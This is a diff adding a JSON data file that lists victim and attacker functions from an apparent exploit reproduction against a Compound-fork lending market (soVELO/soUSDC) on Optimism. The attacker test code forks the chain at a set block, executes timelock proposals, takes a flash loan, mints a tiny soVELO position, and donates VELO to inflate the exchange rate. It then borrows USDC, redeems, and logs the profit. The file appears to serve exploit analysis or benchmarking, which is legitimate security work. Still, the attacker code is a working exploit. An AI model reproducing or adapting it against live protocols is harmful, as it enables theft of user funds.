@@ -1,0 +1,114 @@
+[
+  {
+    "contract/interface": "VolatileV2Pool",
+    "source_type": "victim_contract",
+    "function_name": "swap",
+    "original_code": "    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external nonReentrant {\n        if (IPoolFactory(factory).isPaused()) revert IsPaused();\n        if (amount0Out == 0 && amount1Out == 0) revert InsufficientOutputAmount();\n        (uint256 _reserve0, uint256 _reserve1) = (reserve0, reserve1);\n        if (amount0Out >= _reserve0 || amount1Out >= _reserve1) revert InsufficientLiquidity();\n\n        uint256 _balance0;\n        uint256 _balance1;\n        {\n            // scope for _token{0,1}, avoids stack too deep errors\n            (address _token0, address _token1) = (token0, token1);\n            if (to == _token0 || to == _token1) revert InvalidTo();\n            if (amount0Out > 0) IERC20(_token0).safeTransfer(to, amount0Out); // optimistically transfer tokens\n            if (amount1Out > 0) IERC20(_token1).safeTransfer(to, amount1Out); // optimistically transfer tokens\n            if (data.length > 0) IPoolCallee(to).hook(_msgSender(), amount0Out, amount1Out, data); // callback, used for flash loans\n            _balance0 = IERC20(_token0).balanceOf(address(this));\n            _balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint256 amount0In = _balance0 > _reserve0 - amount0Out ? _balance0 - (_reserve0 - amount0Out) : 0;\n        uint256 amount1In = _balance1 > _reserve1 - amount1Out ? _balance1 - (_reserve1 - amount1Out) : 0;\n        if (amount0In == 0 && amount1In == 0) revert InsufficientInputAmount();\n        {\n            // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n            (address _token0, address _token1) = (token0, token1);\n            if (amount0In > 0) _update0((amount0In * IPoolFactory(factory).getFee(address(this), stable)) / 10000); // accrue fees for token0 and move them out of pool\n            if (amount1In > 0) _update1((amount1In * IPoolFactory(factory).getFee(address(this), stable)) / 10000); // accrue fees for token1 and move them out of pool\n            _balance0 = IERC20(_token0).balanceOf(address(this)); // since we removed tokens, we need to reconfirm balances, can also simply use previous balance - amountIn/ 10000, but doing balanceOf again as safety check\n            _balance1 = IERC20(_token1).balanceOf(address(this));\n            // The curve, either x3y+y3x for stable pools, or x*y for volatile pools\n            if (_k(_balance0, _balance1) < _k(_reserve0, _reserve1)) revert K();\n        }\n\n        _update(_balance0, _balance1, _reserve0, _reserve1);\n        emit Swap(_msgSender(), to, amount0In, amount1In, amount0Out, amount1Out);\n    }\n\n    // force balances to match reserves\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "hook",
+    "original_code": "    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        // 4. Mint 2 wei soVELO\n        CErc20Interface(soVELO).mint(400_000_001);\n\n        uint256 Velo_amount_of_soVelo = IERC20(VELO_Token_V2).balanceOf(soVELO);\n\n        console.log(\"Amount of VELO OF soVELO after minting\", Velo_amount_of_soVelo);\n\n        console.log(\"Amount of soVELO been mint\", IERC20(soVELO).balanceOf(address(this)));\n\n        // 5. Transfer All VELO_Token_V2 to soVELO\n\n        uint256 VeloAmountOfthis = IERC20(VELO_Token_V2).balanceOf(address(this));\n\n        IERC20(VELO_Token_V2).transfer(soVELO, VeloAmountOfthis);\n\n        uint256 Velo_amount_of_soVelo_after_transfer = IERC20(VELO_Token_V2).balanceOf(soVELO);\n\n        console.log(\"Amount of VELO OF soVELO after tranfer\", Velo_amount_of_soVelo_after_transfer);\n\n        // 6. Enter Market\n\n        address[] memory cTokens = new address[](2);\n        cTokens[0] = soUSDC;\n        cTokens[1] = soVELO;\n\n        IUnitroller(Unitroller).enterMarkets(cTokens);\n\n        CErc20Interface(soUSDC).borrow(768_947_220_961);\n\n        uint256 usdc_amount_after_borrow = IERC20(USDC).balanceOf(address(this));\n\n        console.log(\"usdc_amount_after_borrow\", usdc_amount_after_borrow);\n\n        // 7. Redeem\n\n        // uint256 Amount_redeemAllowed = ICointroller(Unitroller).redeemAllowed(soVELO,address(this),2);\n\n        ICErc20Delegate(soVELO).redeemUnderlying(Velo_amount_of_soVelo_after_transfer - 1);\n\n        // ICErc20Delegate(soVELO).redeemUnderlying(1);\n\n        uint256 Velo_amount_of_Attacker_after_redeem = IERC20(VELO_Token_V2).balanceOf(address(this));\n\n        console.log(\"Velo_amount_of_Attacker_after_redeem\", Velo_amount_of_Attacker_after_redeem);\n\n        // // 8. LiquidateBorrow\n\n        // ICErc20Delegate(soUSDC).liquidateBorrow(address(this), 4651761644569103, soVELO);\n\n        // 9. Repay FlashLoan\n\n        IERC20(VELO_Token_V2).transfer(VolatileV2_USDC_VELO, amount1 - 1);\n\n        // 10. Repay FlashLoan Fee with USDC\n\n        IERC20(USDC).transfer(VolatileV2_USDC_VELO, 44_656_863_632);\n\n        // 11. Check profit from this attack\n\n        uint256 Profit = IERC20(USDC).balanceOf(address(this));\n\n        console.log(\"---------------------------------------------------\");\n\n        console.log(\"USDC Profit from this attack: $\", Profit / 10 ** 6);\n\n        console.log(\"---------------------------------------------------\");\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"https://rpc.ankr.com/optimism\", 120_062_493 - 1);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        // 1. Execute proposals\n\n        bytes memory data1 = hex\"fca7820b0000000000000000000000000000000000000000000000000429d069189e0000\";\n\n        bytes memory data2 = hex\"f2b3abbd0000000000000000000000007320bd5fa56f8a7ea959a425f0c0b8cac56f741e\";\n\n        bytes memory data3 = hex\"55ee1fe100000000000000000000000022c7e5ce392bc951f63b68a8020b121a8e1c0fea\";\n\n        bytes memory data4 = hex\"a76b3fda000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe5\";\n\n        bytes memory data5 =\n            hex\"e4028eee000000000000000000000000e3b81318b1b6776f0877c3770afddff97b9f5fe500000000000000000000000000000000000000000000000004db732547630000\";\n\n        t.execute(\n            soVELO,\n            0,\n            data1,\n            0x0000000000000000000000000000000000000000000000000000000000000000,\n            0x476d385370ae53ff1c1003ab3ce694f2c75ebe40422b0ba11def4846668bc84c\n        );\n\n        t.execute(\n            soVELO,\n            0,\n            data2,\n            0x0000000000000000000000000000000000000000000000000000000000000000,\n            0xa57973a3d5a5d99d454c54117d7d30a57a8aca089891f505f120174216edaf42\n        );\n\n        t.execute(\n            Unitroller,\n            0,\n            data3,\n            0x0000000000000000000000000000000000000000000000000000000000000000,\n            0x42408274449fd7829d7fb6abe2e89a618a853acf68d1553b2f6b8b671ac443fd\n        );\n\n        t.execute(\n            Unitroller,\n            0,\n            data4,\n            0x0000000000000000000000000000000000000000000000000000000000000000,\n            0xb02c80e66eae74aef841e5d998aef03d201de66590950b6353e9a28b289c8c8b\n        );\n\n        t.execute(\n            Unitroller,\n            0,\n            data5,\n            0x0000000000000000000000000000000000000000000000000000000000000000,\n            0xe50459992a5c9678d53efbffbf6b95687111e5789dada996e41fea2986077bed\n        );\n\n        // 2. Approve VELO to soVEOLO\n\n        IERC20(VELO_Token_V2).approve(soVELO, type(uint256).max);\n\n        // 3. FlashLoan\n\n        VolatileV2Pool(VolatileV2_USDC_VELO).swap(0, 35_469_150_965_253_049_864_450_449, address(this), hex\"01\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "TimelockController",
+    "source_type": "victim_contract",
+    "function_name": "execute",
+    "original_code": "    function execute(\n        address target,\n        uint256 value,\n        bytes calldata data,\n        bytes32 predecessor,\n        bytes32 salt\n    ) public payable virtual onlyRoleOrOpenRole(EXECUTOR_ROLE) {\n        bytes32 id = hashOperation(target, value, data, predecessor, salt);\n        _beforeCall(id, predecessor);\n        _call(id, 0, target, value, data);\n        _afterCall(id);\n    }\n\n",
+    "description": ""
+  }
+]
